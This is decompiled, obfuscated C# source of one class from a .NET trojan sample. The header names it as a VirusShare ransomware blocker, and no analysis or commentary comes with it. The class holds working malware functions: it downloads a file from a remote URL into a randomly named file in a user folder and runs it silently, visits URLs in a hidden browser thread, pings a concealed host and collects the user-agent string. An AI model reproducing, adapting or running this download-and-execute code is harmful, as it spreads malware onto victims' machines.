// Decompiled with JetBrains decompiler
// Type: M6-n.VG
// Assembly: ]\r, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 954C3D5E-708C-4DD0-82B7-DE2C5BD9F148
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b8539742a30b177b50768aa3e2c5af8a1f70cde6bd248fc157300ef1b9642f75.exe

using M\u000E6\u002Dn\u0008;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace M\u000E6\u002Dn\u0008
{
  internal class VG
  {
    public static Random y0\u003F = new Random();

    public static string \u0029\u0023\u000E\u0012()
    {
      IntPtr num = Marshal.AllocHGlobal((int) byte.MaxValue);
      uint maxValue = (uint) byte.MaxValue;
      VG.\u0027HXw\u0014\u0008(0U, num, ref maxValue);
      return Marshal.PtrToStringAnsi(num);
    }

    public static uint \u0004N\u000D\u0008\u001F()
    {
      uint num;
      VG.Me(m\u003D\u000D.\u001A\u002B\u001B\u0021\u0026NA, out uint _, out num);
      return num;
    }

    public static bool \u005C`(string _param0, string _param1)
    {
      uint num1;
      uint num2;
      VG.Me(_param0, out num1, out num2);
      uint num3;
      uint num4;
      return !VG.Me(_param1, out num3, out num4) && (int) num3 == (int) num1 && (int) num4 == (int) num2;
    }

    public static byte[] \u0016`\u0018\u0029\u0088(object _param0)
    {
      byte[] destination = new byte[0];
      if (_param0 != null)
      {
        if ((object) _param0.GetType() == (object) typeof (byte[]))
          return (byte[]) _param0;
      }
      try
      {
        int length = Marshal.SizeOf(_param0);
        IntPtr num = Marshal.AllocHGlobal(length);
        Marshal.StructureToPtr(_param0, num, false);
        destination = new byte[length];
        Marshal.Copy(num, destination, 0, length);
        Marshal.FreeHGlobal(num);
      }
      catch
      {
      }
      return destination;
    }

    public static string \u000Bm\u0012\u0016(int _param0)
    {
      string str = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u001CFD\u001E\u0028\u0009();
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < _param0; ++index)
        stringBuilder.Append(str.Substring(VG.y0\u003F.Next(0, str.Length), 1));
      return stringBuilder.ToString();
    }

    public static void R\u0019154\u0029\u0013\u0099C(string _param0)
    {
      if (!_param0.StartsWith(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u000C\u0002\u002F()))
        _param0 = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u000C\u0002\u002F() + _param0;
      try
      {
        Thread thread = new Thread((ThreadStart) (() =>
        {
          WebBrowser webBrowser = new WebBrowser();
          webBrowser.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(VG.\u001A\u0098\u0084gMO);
          webBrowser.Navigate(new Uri(_param0));
          Application.Run();
        }));
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
      }
      catch
      {
      }
    }

    private static void \u001A\u0098\u0084gMO(
      object _param0,
      WebBrowserDocumentCompletedEventArgs _param1)
    {
      if (!((_param0 as WebBrowser).Url == _param1.Url))
        return;
      ((Component) _param0).Dispose();
      Application.ExitThread();
      VG.\u001A\u005E();
    }

    public static bool \u00397\u0002(string _param0)
    {
      if (!_param0.StartsWith(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u000C\u0002\u002F()))
        _param0 = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u000C\u0002\u002F() + _param0;
      try
      {
        WebClient webClient = new WebClient()
        {
          Proxy = (IWebProxy) null
        };
        Process process = new Process();
        string lower = _param0.Substring(_param0.LastIndexOf('.')).ToLower();
        string str = Environment.GetEnvironmentVariable(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.e\u001BQ1S\u0023\u000FG()) + \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.n\u0007Y5() + VG.\u000Bm\u0012\u0016(VG.y0\u003F.Next(5, 12)) + lower;
        webClient.DownloadFile(_param0, str);
        if (!System.IO.File.Exists(str))
          return false;
        process.StartInfo.FileName = str;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.ErrorDialog = false;
        process.Start();
        process.Dispose();
        webClient.Dispose();
      }
      catch
      {
        return false;
      }
      return true;
    }

    public static uint \u0021\u0029Z()
    {
      PingReply pingReply = new Ping().Send(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0005\u0021\u0008\u0009\u001A\u008B\u000F(), 1000, new byte[8], new PingOptions()
      {
        DontFragment = true
      });
      return pingReply.Status == IPStatus.Success ? (uint) pingReply.RoundtripTime : 999U;
    }

    public static void \u001A\u005E()
    {
      GC.Collect(GC.MaxGeneration);
      GC.WaitForPendingFinalizers();
      if (Environment.OSVersion.Platform != PlatformID.Win32NT)
        return;
      VG.\u000FX\u002F\u000E3\u0018\u000A(Process.GetCurrentProcess().Handle, (UIntPtr) uint.MaxValue, (UIntPtr) uint.MaxValue);
    }

    [DllImport("kernel32", EntryPoint = "SetProcessWorkingSetSize", CharSet = CharSet.Unicode)]
    private static extern int \u000FX\u002F\u000E3\u0018\u000A(
      IntPtr _param0,
      UIntPtr _param1,
      UIntPtr _param2);

    [DllImport("urlmon", EntryPoint = "ObtainUserAgentString", CharSet = CharSet.Ansi)]
    private static extern bool \u0027HXw\u0014\u0008(uint _param0, IntPtr J3bk8, ref uint _param2);

    [DllImport("imagehlp", EntryPoint = "MapFileAndCheckSum", CharSet = CharSet.Unicode)]
    private static extern bool Me(string _param0, out uint _param1, out uint _param2);
  }
}
